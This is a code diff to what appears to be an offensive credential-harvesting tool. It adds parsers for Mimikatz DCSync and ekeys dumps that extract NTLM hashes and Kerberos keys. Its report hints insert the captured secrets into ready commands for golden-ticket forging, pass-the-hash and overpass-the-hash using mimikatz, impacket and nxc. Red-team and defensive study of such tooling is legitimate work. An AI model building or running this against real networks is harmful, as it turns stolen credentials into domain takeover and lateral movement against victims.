@@ -2845,6 +2845,32 @@ _MK_SAM = re.compile(
     r'User\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
     r'(?:Hash\s+)?NTLM(?:\s+hash)?\s*[:=]\s*([a-f0-9]{32})\b'
 )
+# iter-261: Mimikatz lsadump::dcsync output. Distinctive because of the
+# "Object RDN" + "SAM Username" + "Hash NTLM:" combo, unique to DCSync
+# output vs the shorter lsadump::sam form. "Hash NTLM:" is indented under
+# a "Credentials:" line in real output, so use bounded [\s\S] with the
+# _MK_DCSYNC_BLEED anchor for cross-block guard rather than line-loops.
+_MK_DCSYNC = re.compile(
+    r'(?is)Object\s+RDN\s*:\s*(\S{1,60})[\s\S]{0,400}?'
+    r'SAM\s+Username\s*:\s*(\S{1,60})[\s\S]{0,800}?'
+    r'Hash\s+NTLM\s*[:=]\s*([a-f0-9]{32})\b'
+)
+# iter-261: sekurlsa::ekeys output. Modern format:
+#     * Username : alice
+#     * Domain   : CORP
+#     * Password : (null)
+#     * Key List :
+#         aes256_hmac       4096 <hex>
+#         aes128_hmac       4096 <hex>
+# Older mimikatz builds emit `* Key : aes256_hmac 4096 <hex>` per line.
+# Cross-block guard via _no_bleed with _MK_USER_BLEED anchor.
+_MK_EKEYS_BLOCK = re.compile(
+    r'(?is)\*\s*Username\s*:\s*(\S{1,40})[\s\S]{0,150}?'
+    r'\*\s*Domain\s*:\s*(\S{1,40})[\s\S]{0,300}?'
+    r'(?:\*\s*Key(?:\s+List)?\s*[:\r\n])[\s\S]{0,100}?'
+    r'(aes256_hmac|aes128_hmac|des_cbc_md5)\s+\d+\s+([a-fA-F0-9]{16,64})\b'
+)
+
 # Mimikatz dpapi::cred typed block
 _MK_DPAPI_CRED = re.compile(
     r'(?i)\*\*\*\s*CREDENTIAL\s*\*\*\*[\s\S]{0,400}?'
@@ -3030,6 +3056,10 @@ def _multiline_passes(path, report, store):
     _MK_USER_BLEED = re.compile(r'(?i)\*\s*Username\s*:')
     _MK_RID_BLEED = re.compile(r'(?i)\bRID\s*:\s*[0-9a-f]+\s*\(\d+\)')
     _MK_CRED_BLEED = re.compile(r'(?i)\*\*\*\s*CREDENTIAL\s*\*\*\*')
+    # iter-261: DCSync block bleed anchor. finditer walks Object RDN
+    # per block; the guard catches a lazy span that walked across two
+    # sibling DCSync records (rare but possible with concatenated dumps).
+    _MK_DCSYNC_BLEED = re.compile(r'(?i)Object\s+RDN\s*:')
     _SAM_BLEED = re.compile(r'(?i)\bSamAccountName\s*:')
     _LAZAGNE_BLEED = re.compile(r'(?im)^\s*(?:URL|Login|Username)\s*:')
     # iter-168: fresh `Target: Domain:target=` between our capture spans
@@ -6269,6 +6299,75 @@ def _multiline_passes(path, report, store):
                    f"SAM NTLM {u}: {nt}",
                    hint=f"PtH local: nxc smb <host> -u '{_u_sh}' -H {nt} --local-auth")
         HASHES.append(("1000", "NTLM", nt, path, _ln(m)))
+
+    # iter-261: mimikatz lsadump::dcsync output. krbtgt gets special
+    # CRITICAL golden-ticket-primitive marker; other users emit HIGH.
+    _dc_seen = set()
+    for _dm in _MK_DCSYNC.finditer(text):
+        # cross-block bleed guard: reject if a second "Object RDN:"
+        # sits between the first capture and the Hash NTLM capture.
+        if not _no_bleed(_dm, 1, 3, _MK_DCSYNC_BLEED):
+            continue
+        _sam = _dm.group(2).strip()
+        _nt = _dm.group(3)
+        if _sam in _dc_seen:
+            continue
+        _dc_seen.add(_sam)
+        if filters.is_blank_hash(_nt) or filters.is_canonical_sample(_nt):
+            continue
+        _sam_sh = _sam.replace("'", "'\\''")
+        if _sam.lower() == "krbtgt":
+            report.add("CRITICAL", "PASSWORD HASHES", path, _ln(_dm),
+                       f"DCSync krbtgt NT hash: {_nt} - GOLDEN TICKET "
+                       f"primitive",
+                       hint=(f"forge golden ticket: mimikatz "
+                             f"kerberos::golden /user:<any> /domain:"
+                             f"<domain> /sid:<domain-sid> /krbtgt:"
+                             f"{_nt} /ptt  |  or impacket-ticketer -"
+                             f"nthash {_nt} -domain-sid <sid> -"
+                             f"domain <dom> <user>; export "
+                             f"KRB5CCNAME=<user>.ccache; then "
+                             f"impacket-psexec <user>@<dc-fqdn>"))
+            HASHES.append(("1000", "NTLM (krbtgt)", _nt, path,
+                            _ln(_dm)))
+        else:
+            report.add("HIGH", "PASSWORD HASHES", path, _ln(_dm),
+                       f"DCSync {_sam} NT hash: {_nt}",
+                       hint=(f"PtH: nxc smb <dc> -u '{_sam_sh}' -H "
+                             f"{_nt}  |  or impacket-psexec -hashes "
+                             f":{_nt} '{_sam_sh}'@<dc-fqdn>"))
+            HASHES.append(("1000", "NTLM (DCSync)", _nt, path,
+                            _ln(_dm)))
+
+    # iter-261: mimikatz sekurlsa::ekeys output - captured Kerberos
+    # AES/DES keys. AES256 keys unlock long-term overpass-the-hash
+    # and silver/golden ticket forging without needing NTLM.
+    _ek_seen = set()
+    for _km in _MK_EKEYS_BLOCK.finditer(text):
+        # cross-block bleed guard: reject if a second `* Username :`
+        # sits between the user capture and the key capture.
+        if not _no_bleed(_km, 1, 4, _MK_USER_BLEED):
+            continue
+        _user = _km.group(1).strip()
+        _dom = _km.group(2).strip()
+        _alg = _km.group(3)
+        _key = _km.group(4)
+        _sig = (_user, _alg, _key[:16])
+        if _sig in _ek_seen:
+            continue
+        _ek_seen.add(_sig)
+        _user_sh = _user.replace("'", "'\\''")
+        _mode = "18200" if _alg == "aes256_hmac" else \
+                 ("17500" if _alg == "aes128_hmac" else "")
+        report.add("HIGH", "PASSWORD HASHES", path, _ln(_km),
+                   f"Kerberos {_alg} key for {_dom}\\{_user}: "
+                   f"{_key[:32]}...",
+                   hint=(f"overpass-the-hash: impacket-getTGT -aesKey"
+                         f" {_key} '{_dom}/{_user_sh}'  |  export "
+                         f"KRB5CCNAME=<user>.ccache; then use with "
+                         f"any Kerberos-aware impacket tool  |  "
+                         f"AES keys survive password rotations if "
+                         f"salted with the same domain+user"))
 
     # Mimikatz dpapi::cred typed
     for m in _MK_DPAPI_CRED.finditer(text):
